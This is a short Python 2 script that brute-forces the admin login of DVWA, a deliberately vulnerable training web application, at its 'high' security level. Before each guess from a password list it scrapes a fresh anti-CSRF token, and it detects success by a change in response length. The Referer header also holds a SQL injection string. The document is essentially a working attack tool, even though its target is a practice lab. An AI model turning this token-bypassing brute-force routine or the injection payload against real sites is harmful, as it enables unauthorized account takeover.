# -*- coding:utf-8 -*-  
from bs4 import BeautifulSoup
import urllib2
header={        
	'Host': 'www.dvwa.com',
	'Cache-Control': 'max-age=0',
	'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Referer': 'http://www.dvwa.com/vulnerabilities/brute/?username=admin%27+or+%271%27%3D%271&password=&Login=Login',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
	'Cookie': 'PHPSESSID=3p8vanautbo4klaldp7k7lqhs0; security=high'
}

requrl = "http://www.dvwa.com/vulnerabilities/brute/index.php"

def get_token(requrl,header):
	req = urllib2.Request(url=requrl,headers=header)
	response = urllib2.urlopen(req)

	the_page = response.read()
	

	soup = BeautifulSoup(the_page,"html.parser")


	user_token = soup.form.find_all('input')[3]["value"] #get the user_token
	return user_token

user_token = get_token(requrl,header)


i=0
for line in open("dict.txt"):
	req = "http://www.dvwa.com/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token
	i = i+1
	print i,'admin',line.strip(),"\r"
	response = urllib2.urlopen(req)
	the_page = response.read()
	length = len(the_page)

	code = response.getcode()
	print code,'\r'
	print length

	if length!=1523:
		break;

	if i==26:
		break;

	user_token = get_token(requrl,header)
	# if (i == 10):
	# 	break